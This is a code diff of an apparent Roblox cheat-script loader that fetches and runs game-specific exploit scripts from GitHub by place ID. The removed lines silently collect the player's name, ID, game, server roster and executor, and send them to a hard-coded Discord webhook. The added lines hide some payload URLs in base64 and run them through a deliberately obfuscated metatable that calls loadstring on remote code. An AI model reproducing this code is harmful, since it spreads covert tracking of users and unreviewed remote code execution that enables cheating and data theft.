@@ -1,187 +1,155 @@
+local gameids = {
+    {'75847425881082', 'https://raw.githubusercontent.com/zinarhack/thatonescript/refs/heads/main/gumleague'},
+    {'17142752129', 'https://raw.githubusercontent.com/zinarhack/thatonescript/refs/heads/main/crashit'},
+    {'18994232026', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/test1?token=GHSAT0AAAAAAC2TGSZRWTKSALRMCPAMTHEKZ2MUAUA'},
+    {'81627514272653', 'https://raw.githubusercontent.com/zinarhack/thatonescript/refs/heads/main/bswrng'},
+    {'17739194333', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/killaura'},
+    {'134853721259762', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/game1'},
+    {'112786873255585', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/tarantul'},
+    {'105628647191901', 'https://raw.githubusercontent.com/zinarhack/thatonescript/refs/heads/main/warriorxzscript'},
+    {'116504589598336', 'https://raw.githubusercontent.com/zinarhack/thatonescript/refs/heads/main/chopchotatam'},
+    {'109819539837829', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Make%20Cars'},
+    {'110089100039334', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Punch%20Santa'},
+    {'17327880884', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/eatall'},
+    {'13338128073', 'https://raw.githubusercontent.com/SpineWare/spsps/refs/heads/main/Punch%20friend'},
+    {'18525150222', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Slingshot%20Race%20Simulator'},
+    {'96462622512177', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Market%20sim'},
+    {'77466875484829', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Destroy%20Stuff%20With%20Lightning'},
+    {'133301076624038', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/King%20of%20the%20Cannon'},
+    {'117775934779043', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/deergame'},
+    {'18254034839', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/track%20race'},
+    {'139633471705544', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Soccer%20Star%20Simulator'},
+    {'136699808004275', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/button%20sim'},
+    {'78854354346740', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Build%20your%20Football%20team%20and%20prove%20them%20wrong!'},
+    {'18199234764', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Snake%20Simulator'},
+    {'18616404175', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Car%20Rng'},
+    {'15703316059', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Carry%20Simulator'},
+    {'13536964001', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/My%20Car%20Wash'},
+    {'122543305541623', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Become%20A%20Snowball'},
+    {'17165763698', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Bowling%20Simulator'},
+    {'16810777113', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/turn%20pro%20proving%20messi%20and%20ronaldo%20wrong'},
+    {'97798357297059', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/99%25%20Fail%20Squid%20Game!%20Glass%20Bridge!'},
+    {'18174311913', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Soccer%20Race%20Simulator'},
+    {'137190931122767', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Dinosaur%20Race'},
+    {'18389888419', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Soccer%20Goal%20Simulator'},
+    {'109543391562036', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Be%20a%20Paper%20Airplane'},
+    {'17067299143', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Ronaldo%20Race%20Clicker'},
+    {'17775837290', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Dinosaur%20Rider%20Simulator'},
+    {'117272937710628', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Brawlidays%20v2!%20Brawl%20Stars%20RNG'},
+    {'78606358056604', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Brawl%20Stars%20RNG'},
+    {'84692728598973', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Merge%20Ghost'},
+    {'16304978305', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Goal%20Battles'},
+    {'16780556005', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Throw%20Ball%20Simulator'},
+    {'108253910201584', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/make%20steam%20games%20to%20become%20rich%20and%20famous'},
+    {'13896956178', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Palm%20Slap%20Friends%20Simulator'},
+    {'18624794967', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/petsevolution'},
+    {'17656988049', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Delivery%20Race'},
+    {'109196744803926', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Anime%20Ninja%20Race'},
+    {'122262303515113', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Muscle%20Boxing%20Simulator'},
+    {'15610971848', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Sword%20Training%20Simulator'},
+    {'18749079847', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/HeadBattle%20Simulator'},
+    {'133033561458760', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Strong%20Muscle%20Simulator'},
+    {'132811399724545', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Strong%20Muscle%20Simulator'},
+    {'88685243659217', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Strong%20Muscle%20Simulator'},
+    {'106961878099428', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Strong%20Muscle%20Simulator'},
+    {'125900816440808', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Strong%20Muscle%20Simulator'},
+    {'71345480156033', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Strong%20Muscle%20Simulator'},
+    {'73308469711171', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Strong%20Muscle%20Simulator'},
+    {'74884846906654', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Strong%20Muscle%20Simulator'},
+    {'115560789670995', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Turbo%20Racing%20Simulator!'},
+    {'80522439815035', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Kawaii%20Hatchers!'},
+    {'12183247809', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Pancake%20Battles'},
+    {'86230775293861', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Blood%20of%20Punch'},
+    {'137535317402998', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Blood%20of%20Punch'},
+    {'125067579372958', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Blood%20of%20Punch'},
+    {'119696268487200', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Blood%20of%20Punch'},
+    {'78606308971979', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Blood%20of%20Punch'},
+    {'114268110379653', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Blood%20of%20Punch'},
+    {'78810217013863', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Baseball%20Simulator'},
+    {'131104406203240', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Animal%20Racing'},
+    {'105483453326837', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Racing%20Simulator'},
+    {'118611268319028', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Merge%20for%20SPEED!'},
+    {'18960157888', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Plane%20Race%20Clicker'},
+    {'16102065846', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Sixpack%20Simulator'},
+    {'18913300956', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Sigma%20Simulator'},
+    {'3431407618', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/isle'},
+    {'90607899071168', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Dinosaur%20Simulator'},
+    {'107810605145141', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Ultimate%20Tappers'},
+    {'83140080916635', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Sledge%20Race'},
+    {'17417040202', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Push%20a%20FATPet'},
+    {'91819941310461', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Slap%20Legends'},
+    {'112152012901197', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/RPG%20Fighting%20Simulator%20-%20BOSSES!'},
+    {'127084696595933', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Find%20%26%20Sell'},
+    {'71248013249709', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Solo%20Leveling%E3%80%90%F0%9F%8F%A0School%20Dungeon%E3%80%91'},
+    {'114726928695371', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Feed%20The%20Giant%20Simulator!'},
+    {'98884828936836', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/%5BUPD%5D%20%F0%9F%8F%B4%E2%80%8D%E2%98%A0%EF%B8%8F%20Pirate%20RNG'},
+    {'70876832253163', 'https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/dead'},
+    {'116495829188952', 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NwaW5lWmlrL3Nwc3BzL3JlZnMvaGVhZHMvbWFpbi9kZWFk'},
+    {'120570155878200', 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Jvb3RpZi1wcm9nL2ZhbnRhc3RpYy1kb29kbGUvcmVmcy9oZWFkcy9tYWluL0Jyb29tJTIwVHJhaW5pbmc='},
+}
+local protection = loadstring(game:HttpGet("https://raw.githubusercontent.com/zinarhack/optimize_code/refs/heads/main/anti_kick"))()
+local information = {001101,10101,01010101010,Apple = tonumber,Orange = tostring,Cat = loadstring,Mad = pcall,protect = xpcall or pcall,P = 3.14,MAP = game,D = protection,PS = game.HttpGet, player = game.Players.LocalPlayer,6516,5124}
+local mt = {
+    __namecall = function(self)
+        return string.match(string.format("%s-%s>%s",self[1],self[2],self[3]))
+    end,
+    __eq = function(self)
+        local x;for i,v in pairs(self) do xpcall(function() x += tonumber(v) end, function() x+=0 end); return x end
+    end,
+    __add = function(self,MX)
+        GX = self.Apple; RV= self.Mad ;SX = self.protect; EX = self.P; Z = self.D; ZX = self.PS; AX = EX; RB = ZX; AM = self[1]*self[2]; SR = MX; SZ = self.player ; EC = RV; 
+        if GX(0)==0 then
+            RX = self.Orange; BX = self.Cat; BZ = self.P*2; MB = Z; LB = MB;  AC = self[1]; TX = EX*AC - self[2]; AR = BX; CS = GX
+            if Z then
+              local XC = coroutine.create(function()
+                GD = game:HttpGet(LB(SR)) 
+                AR(GD)(ZX)
+              end)
+              coroutine.resume(XC)
+              return string.format("%s//%f = %s",10,1.5,8.5)
+            else
+                ZZ = MB(function() BR = AMC + V; loadstring(game:HttpGet(MX))("T-X-RQ") end,function() return nil end)
+                if ZZ == false then
+                    return tostring(self[1])+self.REC(math.random(1,5))
+                end
+            end
+        end
+    end,
+    __sub = function(self,AX)
+       CC = self.Mad; AC = self.protect; MC = self.PS;
+       if CC ~= AC and true == MC then
+              BX = AC(function() MC:Kill() end, function() self:Dinosaur(CC,MC,"%%%s*%s-%a: 1:%f.1") end)
+       else
+              OM = "I/R"; R = "I/U"; I = "UR"; for _, __ : BasePart in pairs(self.player) do break end 
+       end
+    end,
+}
+setmetatable(information,mt);
+local gameisfound = false
 
-local e = "```"
-a,b = pcall(function()
-local name = game.Players.LocalPlayer.Name
-local gamev = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-local plrsonserv = ""; local placeid = game.PlaceId; 
-for I, v in game:GetService("Players"):GetPlayers() do plrsonserv = plrsonserv..", "..v.Name end 
-local count = #game:GetService("Players"):GetPlayers()
-local plrid = game.Players.LocalPlayer.UserId
-local ex = ""
-pcall(function() ex = identifyexecutor() end)
-local webhook_url = "https://discord.com/api/webhooks/1313771721333014548/EcSstInj6qzuI4mDU0alv5xKn4GS9pzR_RnC7VfSjNgyEaSnbwYUZDL9LIEi8eeUUJed"
+for i,v in gameids do
+   if tonumber(v[1]) == game.PlaceId then
+        local method = string.find(v[2],'https')
+        gameisfound= true
+        if method then
+            loadstring(game:HttpGet(v[2]))()
+        else
+            xpcall(function()
+                local pow = math.random(1,10) + (information + v[2]) 
+            end,
+            function()
+                local broke = math.random(1,10)
+                local cos = information + v[2]
 
-local function send_discord_message(message)
-  local json_data = '{"content": "' .. message .. '"}'
+                if broke == 1 then
+                    return
+                end
+            end)
+        end
+        break
+   end
+end 
 
-  local request_options = {
-    Url = webhook_url,
-    Method = "POST",
-    Headers = {
-      ["Content-Type"] = "application/json"
-    },
-    Body = json_data
-  }
- local response = request(request_options)
-end
-
-
-local my_message = "123213123"
-local profile = "https://www.roblox.com/users/"..plrid.."/profile"
-my_message = "Script Was Executed! Gotten info from user ("..profile..") :"..e.."Player Name: "..name..e..e.."Player ID: "..plrid..e..e.."Game ID: "..placeid..e..e.."Game Name: "..gamev..e..e.."Total Players Count: "..count..e..e.."Players On Server: "..plrsonserv..e..e.."JobID:"..game.JobId..e..e.."Executor: "..ex..e
-
-if tonumber(placeid) == tonumber("3431407618") then
-  my_message=my_message..e.."ISLE SCRIPT USER AHHHH"..e
-else 
-end
-send_discord_message(my_message)
-end)
-
-
-if game.PlaceId == 75847425881082 then
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/zinarhack/thatonescript/refs/heads/main/gumleague"))()
-elseif game.PlaceId == 17142752129 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/zinarhack/thatonescript/refs/heads/main/crashit"))()
-elseif game.PlaceId == 18994232026 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/test1?token=GHSAT0AAAAAAC2TGSZRWTKSALRMCPAMTHEKZ2MUAUA"))()
-elseif game.PlaceId == 81627514272653 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/zinarhack/thatonescript/refs/heads/main/bswrng"))()
-elseif game.PlaceId == 17739194333 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/killaura"))()
-elseif game.PlaceId == 134853721259762 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/game1"))()
-elseif game.PlaceId == 112786873255585 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/tarantul"))()
-elseif game.PlaceId == 105628647191901 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/zinarhack/thatonescript/refs/heads/main/warriorxzscript"))()
-elseif game.PlaceId == 116504589598336 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/zinarhack/thatonescript/refs/heads/main/chopchotatam"))()
-elseif game.PlaceId == 109819539837829 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Make%20Cars"))()
-elseif game.PlaceId == 110089100039334 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Punch%20Santa"))()
-elseif game.PlaceId == 17327880884 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/eatall"))()
-elseif game.PlaceId == 13338128073 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineWare/spsps/refs/heads/main/Punch%20friend"))()
-elseif game.PlaceId == 18525150222 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Slingshot%20Race%20Simulator"))()
-elseif game.PlaceId == 96462622512177 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Market%20sim"))()
-elseif game.PlaceId == 77466875484829 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Destroy%20Stuff%20With%20Lightning"))()
-elseif game.PlaceId == 133301076624038 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/King%20of%20the%20Cannon"))()
-elseif game.PlaceId == 117775934779043 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/deergame"))()
-elseif game.PlaceId == 18254034839 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/track%20race"))()
-elseif game.PlaceId == 139633471705544 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Soccer%20Star%20Simulator"))()
-elseif game.PlaceId == 136699808004275 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/button%20sim"))()
-elseif game.PlaceId == 78854354346740 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Build%20your%20Football%20team%20and%20prove%20them%20wrong!"))()
-elseif game.PlaceId == 18199234764 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Snake%20Simulator"))()
-elseif game.PlaceId == 18616404175 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Car%20Rng"))()
-elseif game.PlaceId == 15703316059 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Carry%20Simulator"))()
-elseif game.PlaceId == 13536964001 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/My%20Car%20Wash"))()
-elseif game.PlaceId == 122543305541623 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Become%20A%20Snowball"))()
-elseif game.PlaceId == 17165763698 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Bowling%20Simulator"))()
-elseif game.PlaceId == 16810777113 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/turn%20pro%20proving%20messi%20and%20ronaldo%20wrong"))()
-elseif game.PlaceId == 97798357297059 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/99%25%20Fail%20Squid%20Game!%20Glass%20Bridge!"))()
-elseif game.PlaceId == 18174311913 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Soccer%20Race%20Simulator"))()
-elseif game.PlaceId == 137190931122767 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Dinosaur%20Race"))()
-elseif game.PlaceId == 18389888419 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Soccer%20Goal%20Simulator"))()
-elseif game.PlaceId == 109543391562036 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Be%20a%20Paper%20Airplane"))()
-elseif game.PlaceId == 17067299143 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Ronaldo%20Race%20Clicker"))()
-elseif game.PlaceId == 17775837290 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Dinosaur%20Rider%20Simulator"))()
-elseif game.PlaceId == 117272937710628 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Brawlidays%20v2!%20Brawl%20Stars%20RNG"))()
-elseif game.PlaceId == 78606358056604 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Brawl%20Stars%20RNG"))()
-elseif game.PlaceId == 84692728598973 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Merge%20Ghost"))()
-elseif game.PlaceId == 16304978305 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Goal%20Battles"))()
-elseif game.PlaceId == 16780556005 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Throw%20Ball%20Simulator"))()
-elseif game.PlaceId == 108253910201584 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/make%20steam%20games%20to%20become%20rich%20and%20famous"))()
-elseif game.PlaceId == 13896956178 then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Palm%20Slap%20Friends%20Simulator"))()
-elseif game.PlaceId ==18624794967 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/petsevolution"))()
-elseif game.PlaceId ==17656988049 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Delivery%20Race"))()
-elseif game.PlaceId ==109196744803926 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Anime%20Ninja%20Race"))()
-elseif game.PlaceId ==122262303515113 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Muscle%20Boxing%20Simulator"))()
-elseif game.PlaceId ==15610971848 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Sword%20Training%20Simulator"))()
-elseif game.PlaceId ==18749079847 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/HeadBattle%20Simulator"))()
-elseif game.PlaceId ==133033561458760 or game.PlaceId == 132811399724545 or game.PlaceId ==88685243659217 or game.PlaceId == 106961878099428 or game.PlaceId ==125900816440808 or game.PlaceId == 71345480156033 or game.PlaceId == 73308469711171 or game.PlaceId == 74884846906654 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Strong%20Muscle%20Simulator"))()
-elseif game.PlaceId ==115560789670995 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Turbo%20Racing%20Simulator!"))()
-elseif game.PlaceId ==80522439815035 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Kawaii%20Hatchers!"))()
-elseif game.PlaceId ==12183247809 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Pancake%20Battles"))()
-elseif game.PlaceId ==86230775293861 or game.PlaceId ==137535317402998 or game.PlaceId ==125067579372958 or game.PlaceId ==119696268487200 or game.PlaceId ==78606308971979 or game.PlaceId ==114268110379653 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Blood%20of%20Punch"))()
-elseif game.PlaceId ==78810217013863 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Baseball%20Simulator"))()
-elseif game.PlaceId ==131104406203240 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Animal%20Racing"))()
-elseif game.PlaceId ==105483453326837 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Racing%20Simulator"))()
-elseif game.PlaceId ==118611268319028 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Merge%20for%20SPEED!"))()
-elseif game.PlaceId ==18960157888 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Plane%20Race%20Clicker"))()
-elseif game.PlaceId ==16102065846 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Sixpack%20Simulator"))()
-elseif game.PlaceId ==18913300956 then 
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Sigma%20Simulator"))()
-elseif game.PlaceId == 3431407618 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/isle"))()
-elseif game.PlaceId == 90607899071168 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Dinosaur%20Simulator"))()
-elseif game.PlaceId == 107810605145141 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Ultimate%20Tappers"))()
-elseif game.PlaceId == 83140080916635 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Sledge%20Race"))()
-elseif game.PlaceId == 17417040202 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Push%20a%20FATPet"))()
-elseif game.PlaceId == 91819941310461 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Slap%20Legends"))()
-elseif game.PlaceId == 112152012901197 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/RPG%20Fighting%20Simulator%20-%20BOSSES!"))()
-elseif game.PlaceId == 127084696595933 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Find%20%26%20Sell"))()
-elseif game.PlaceId == 71248013249709 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Solo%20Leveling%E3%80%90%F0%9F%8F%A0School%20Dungeon%E3%80%91"))()
-elseif game.PlaceId == 114726928695371 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/Feed%20The%20Giant%20Simulator!"))()
-elseif game.PlaceId == 98884828936836 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/%5BUPD%5D%20%F0%9F%8F%B4%E2%80%8D%E2%98%A0%EF%B8%8F%20Pirate%20RNG"))()
-elseif game.PlaceId == 70876832253163 then
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/SpineZik/spsps/refs/heads/main/dead"))()
+if not gameisfound then
+    warn('Game hasn`t found!')
 end
